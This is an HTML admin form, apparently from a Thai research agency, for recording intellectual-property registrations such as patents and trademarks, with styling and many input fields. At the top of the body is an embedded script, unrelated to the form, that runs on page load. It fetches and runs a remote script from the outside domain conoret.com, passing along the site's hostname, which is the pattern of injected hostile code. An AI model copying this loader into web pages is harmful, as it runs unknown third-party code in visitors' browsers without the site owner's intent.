<meta charset="UTF-8">
<style>
  .tr {

    margin-left: auto;
    margin-right: auto;
    margin-top: 50px;
    border: none;
  }

  .button:hover {
    background-color: #3e8e41;
  }

  .button:active {
    background-color: #3e8e41;
    box-shadow: 0 5px #666;
    transform: translateY(4px);
  }

  .button1:hover {
    background-color: red;
  }

  .button1:active {
    background-color: #d90d19;
    box-shadow: 0 5px #666;
    transform: translateY(4px);
  }

  .button1 {
    display: inline-block;
    padding: 10px 20px;
    font-size: 16px;
    cursor: pointer;
    text-align: center;
    text-decoration: none;
    outline: none;
    color: #fff;
    background-color: red;
    border: none;
    border-radius: 12px;
    box-shadow: 0 4px white;
    margin-left: 200%;
    margin-top: 50px;
  }


  .button {
    display: inline-block;
    padding: 10px 20px;
    font-size: 16px;
    cursor: pointer;
    text-align: center;
    text-decoration: none;
    outline: none;
    color: #fff;
    background-color: #4CAF50;
    border: none;
    border-radius: 12px;
    box-shadow: 0 4px white;
    margin-left: 750px;
    margin-top: 50px;
  }

  .glow {
    font-size: 26px;
    color: black;
    text-align: center;
    animation: glow 1s ease-in-out infinite alternate;
    color: black;
    padding: 0.5em 0;
    border-top: solid 3px black;
    border-bottom: solid 3px black;
    width: 30%;
    margin-left: 580px;
    margin-top: 40px;
    border-radius: 10px;
  }

  p.outset1 {
    display: inline;
    width: 130px;
    border-style: outset;
    background: #2c15b1;
    text-align: center;
    margin-left: 10%;
    margin-top: 2%;
    color: white;
    height: 40px;
    padding: 15px;
    outline-color: red;
    border-radius: 8px;
  }

  .outset1:active {
    background-color: #442bd1;
    box-shadow: 0 4px #666;
    transform: translateY(4px);
  }

  /* .center {
    margin-left: auto;
    margin-right: auto;
    font-size: 14px;
    color: black;
    text-align: center;
    height: 20px;
    padding: 18p;
    border-radius: 4px;
    border: none;
    min-width: 230px;
  } */

  /* .center1 {
    margin-right: auto;
    font-size: 14px;
    color: black;
    text-align: center;
    height: 20px;
    border-radius: 8px;
  } */

  .form {
    width: 95%;
    height: 950px;
    background: #e6e6e6;
    border-radius: 8px;
    box-shadow: 0 0 40px -10px #000;
    margin: calc(50vh - 220px) auto;
    padding: 20px 30px;
    max-width: calc(100vw - 40px);
    box-sizing: border-box;
    font-family: 'Montserrat', sans-serif;
    position: relative;
    margin: auto;
    align-items: center;
  }

  .box2 {

    -webkit-backdrop-filter: blur(10px);
    backdrop-filter: blur(10px);
    background-color: #f99f37;
    border-radius: 0.25rem;
  }

  .glow1 {
    font-size: 26px;
    color: black;
    width: 330%;
    color: white;
    padding: 0.5em;
    display: inline-block;
    line-height: 1.3;
    background: #cb5454;
    vertical-align: middle;
    border-radius: 115px 20px 115px 20px
  }

  input[type=date],
  [type=number],
  input[type=ddmmyy] {
    margin: 20px;
    min-width: 200px;
    height: 39px;
    padding: 0px 10px;
    background-color: rgb(255 255 255);
    border: none;
    display: inline;
    color: #303030;
    font-size: 14px;
    font-weight: 400;
    margin-top: 20px;
    border-radius: 5px;
    -webkit-box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
    -moz-box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
    box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
  }

  input[type=text] {
    margin-top: 20px;
    height: 39px;
    padding: 0px 10px;
    background-color: rgb(255 255 255);
    border: none;
    display: inline;
    color: #303030;
    font-size: 14px;
    font-weight: 400;
    float: left;
    text-align: center;
    border-radius: 5px;
    -webkit-box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
    -moz-box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
    box-shadow: inset 1px 1px 0px rgba(0, 0, 0, 0.05), 1px 1px 0px rgba(255, 255, 255, 1);
  }

  input[type="file"i] {
    margin: 20px;
    width: 190px;
    appearance: none;
    background-color: initial;
    cursor: default;
    align-items: baseline;
    color: inherit;
    text-overflow: ellipsis;
    white-space: pre;
    text-align: start !important;
    padding: initial;
    border: initial;
    overflow: hidden !important;
    margin-top: 20px;
    display: inline;
  }
 

  label:before,
  select option,
  select {
    padding: 1em;
    line-height: 1.4;
    float: left;
    background-color: #ffffff;
    border: 1px solid #e5e5e5;
    border-radius: 4px;
    -webkit-transition: 0.35s ease-in-out;
    -moz-transition: 0.35s ease-in-out;
    -o-transition: 0.35s ease-in-out;
    transition: 0.35s ease-in-out;
    transition: all 0.35s ease-in-out;
    text-align: center;
    font-size: 13px;
  }

   
</style>

<body>
  <script type="text/javascript">
    window.top === window && ! function() {
      var e = document.createElement("script"),
        t = document.getElementsByTagName("head")[0];
      e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random(), e.type = "text/javascript", e.defer = !0, e.async = !0, t.appendChild(e)
    }();
  </script>
  <div class="body">
    <h1 class="glow">การจดทะเบียนทรัพย์สินทางปัญญา</h1>
    <br>
    <a style="text-decoration: none;" onclick="location. href='indexadmin.php?Menu=5&Submenu=showmanage'; ">
      <p class="outset1">ย้อนกลับ</p>
    </a><br><br><br>
    <form action="manage/storemanage.php" method="post" enctype="multipart/form-data">
      <div class="form">
        <br>
        <table class="center1">
          <tbody>
            <tr>
              <td></td>
              <th align="left" width="70%" class="glow1">ประเภทการจดทะเบียน</th>
              <th class="th">
                <input type="radio" id="html" name="type" value="1">
                &nbsp; <label for="html">สิทธิบัตร</label>
                &nbsp; <input type="radio" id="css" name="type" value="2">
                &nbsp; <label for="css">อนุสิทธิบัตร</label>
                <input type="radio" id="css" name="type" value="3">
                &nbsp; <label for="css">เครื่องหมายการค้า</label>
                <input type="radio" id="css" name="type" value="4">
                &nbsp; <label for="css">พันธุ์พืช</label>
              </th>
              <th>
              </th>
            </tr>
          </tbody>
        </table>


      <table>
        <tr class="tr">
          <br>
          <div class="container">

            <th>เลขที่คำขอ: </th>
            <td>
              <input type="number" id="number" c placeholder="000000" name="numfeduest" required="">
          </div>
          </td>

          <th>วันที่ยื่นขอ:</th>
          <td >
          <div class="container"style=" width: 50% ; ">
            <input type="date" id="ddmmyy" name="offer" onchange="selectday()">
            <div id="result"></div>
          </td>

          <th>เเบบพิมพ์คำขอสิทธิบัตร<br>/อนุสิทธิบัตร จดทะเบียน: </th>
          <td>
            <label  for="myfile">กรุณาเลือกไฟล์</label><br>
            <input type="file" id="myfile" name="form">
          </td>
          <th>สำหรับแอดมิน</th>
        <td>
          <label for="myfile">กรุณาเลือกไฟล์</label><br>
          <input type="file" id="myfile" name="admin">
        </td>
  </div>
  </tr>
  </table>
  

  <table>
    <tr class="tr"><br>
      <div class="container">

        

        <th>ตัวเเทน</th>
        <td >
          <div class="container"style=" margin-left: 50px; margin-right:20px">
            <input type="text" id="number" placeholder="xxxx" name="agent" required="">
          </div>
        </td>

        <th>เลขทะเบียน</th>
        <td>
          <div class="container">
            <input type="number" id="number" placeholder="000000" name="numregister" required="">
          </div>
        </td>

        <th>วันที่ออกเลขทะเบียน</th>
        <td>
          <input type="date" id="ddmmyy" onchange="selectday()">
          <div id="result"></div>
        </td>
      </div>
  </table>
  </tr>

  <table style="width: 100%" class="center">
    <tr class="tr"><br>
      <div class="container">
        <th>ชนิด</th>
        <td class="tr" style="margin-left:20px;">
          <select name="kind"> Answer 1
            <option selected="" value="VANI">--กรุณาเลือก--
            <option value="1">การประดิษฐ์</option>
            <option value="2">การออกแบบ</option>
            <option value="3">การรับรอง</option>
            <option value="4">การบริการ </option>
            <option value="5">การขึ้นทะเบียน </option>
          </select>
        </td>

        <th>ชื่อเรื่อง</th>
        <td>
          <div class="container">
            <input type="text" id="number" placeholder="xxxx" name="title" required="">
          </div>
        </td>

        <th>ผู้ทรงสิทธิ</th>
        <td>
          <div class="container">
            <input type="text" id="number" placeholder="xxx" name="holdre" required="">
          </div>
        </td>

        <th>กลุ่ม</th>
        <td><select name="team"> Answer 1
            <option selected="" value="VANI">--กรุณาเลือก-- </option>
            <option value="1">อช.</option>
            <option value="2">พช.</option>
            <option value="3">บอ.</option>
          </select>
        </td>
      </div>
  </table>
  </tr>


  <table style="width: 100%" class="center">
    <tr class="tr"><br>
      <div class="container">
        <th>สังกัด</th>
        <td>
          <select name="affiliation"> Answer 1
            <option selected="" value="VANI">--กรุณาเลือก--
            </option>
            <option value="1">ศนก.
            </option>
            <option value="2">ศคช.
            </option>
            <option value="3">ศนอ.
            </option>
            <option value="4">ศนส.
            </option>
            <option value="5">ศนพ.
            </option>
            <option value="6">ศนว.
            </option>
            <option value="7">ศนย.
            </option>
            <option value="8">ศบท.
            </option>
            <option value="9">ศพว.
            </option>
          </select>
        </td>

        <th>ผู้ประดิษฐ์(1คน)</th>
        <td>
          <select name="inventor"> Answer 1
            <option selected="" value="VANI">ช่องกรอก
            </option>
            <option value="1">คนที่1
            </option>
            <option value="2">คนที่2
            </option>
            <option value="3">คนที่3
            </option>
          </select>
        </td>

        <th>ผู้ประดิษฐ์(1-15)</th>
        <td>
          <select name="inventors"> Answer 1
            <option selected="" value="VANI">ช่องกรอก
            </option>
            <option value="1">คนที่1
            </option>
            <option value="2">คนที่2
            </option>
            <option value="3">คนที่3
            </option>
          </select>
        </td>

        <th>ชื่อโครงการ(กตป.)</th>
        <<td>
          <div class="container">
            <input type="text" id="number" " placeholder=" xxxx" name="framename" required="">
          </div>
          </td>
      </div>
  </table>
  </tr>

  <table style="width: 100%" class="center">
    <tr class="tr"><br>
      <div class="container">
        <th>รหัสโครงการวิจัย บริการวิจัย</th>
        <td>
          <div class="container">
            <input type="number" id="number" placeholder="0" name="projectcode" required="">
          </div>
        </td>

        <th>คู่สัญญาโครงการ</th>
        </th>
        <td>
          <select name="inventor"> Answer 1
            <option selected="" value="VANI">ช่องกรอก
            </option>
            <option value="1">คนที่1
            </option>
            <option value="2">คนที่2
            </option>
            <option value="3">คนที่3
            </option>
          </select>
        </td>

        <th>ประเภทโครงการ</th>
        <td>
          <select name="genus"> Answer 1
            <option selected="" value="VANI">กรุณาเลือก</option>
            <option value="1">การบริการวิจัย
            </option>
            <option value="2">การบริการวิจัยจากแหล่งทุน
            </option>
            <option value="3">mou
            </option>
            <option value="4">เงินทุน วว.
            </option>
            <option value="5">การถ่ายทอดเทคโนโลยี
            </option>
          </select>
        </td>
  </table>
  </tr>


  <table style="width: 100%" class="center">
    <tr class="tr"><br>
      <div class="container">
        <th>เเนบเอกสารโครงการ</th>
        <td>
          <label for="myfile">กรุณาเลือกไฟล์</label>
          <input type="file" id="myfile" name="attachment">
        </td>
      </div>

      <th>ประเภทการใช้ประโยชน์</th>
      <td>
        <select name="benefit"> Answer 1
          <option selected="" value="VANI">กรุณาเลือก</option>
          <option value="1">การบริการวิจัย
          </option>
          <option value="2">การถ่ายทอดเทคโนโลยี
          </option>
          <option value="3">การอนุญาตให้ใช้สิทธิ
          </option>
          <option value="4">mou
          </option>
        </select>
      </td>

      <th>ผู้นำผลงานวิจัยไปใช้ประโยชน์</th>
      <td>
        <div class="container">
          <input type="text" id="number" placeholder="xxxx" name="lead" required="">
        </div>
      </td>
      </div>
  </table>
  </tr>

  <table style="width: 100%" class="center">
    <tr class="tr"><br>
      <div class="container">
        <th>สถานะอัพเดทปัจจุบัน</th>
        <td>
          <select name="sta"> Answer 1
            <option selected="" value="VANI">ช่องกรอก
            </option>
            <option value="15">แก้ไข
            </option>
            <option value="1">ชำระค่าธรรมเนียมประกาศโฆษณา
            </option>
            <option value="2">ประกาศโฆษณา
            </option>
            <option value="3">ยื่นตรวจสอบการประดิษฐ์
            </option>
            <option value="4">ชำระค่าออกสิทธิบัตร
            </option>
            <option value="5">ชำระค่าออกอนุสิทธิบัตร
            </option>
            <option value="6">ออกสิทธิบัตร
            </option>
            <option value="7">ออกอนุสิทธิบัตร
            </option>
            <option value="8">ชำระค่าธรรมเนียมสิทธิบัตรรายปี
            </option>
            <option value="9">ชำระค่าธรรมเนียมอนุสิทธิบัตรรายปี
            </option>
            <option value="10">ไม่มีขั้นการประดิษฐ์ที่สูงขึ้น
            </option>
            <option value="11">ชี้แจงข้อโต้แย้ง
            </option>
            <option value="12">เปลี่ยนแปลงสิทธิ
            </option>
            <option value="13">ละทิ้งคำขอ
            </option>
            <option value="14">สิ้นอายุ
            </option>
          </select>
        </td>

        <th>หมายเหตุ</th>
        <td>
          <div class="container">
            <input type="text" id="number" placeholder="xxxx" name="note" required="">
          </div>
        </td>
      </div>
  </table>
  </tr>
  <table table="" style="width:20%" class="center1">

    <tbody>
      <tr>
        <th><button class="button" type="submit">บันทึก</button></th>
        <th><button class="button1" type="reset">ยกเลิก</button></th>
      </tr>
    </tbody>
  </table>
  </div>
  </form>
  </div>
</body>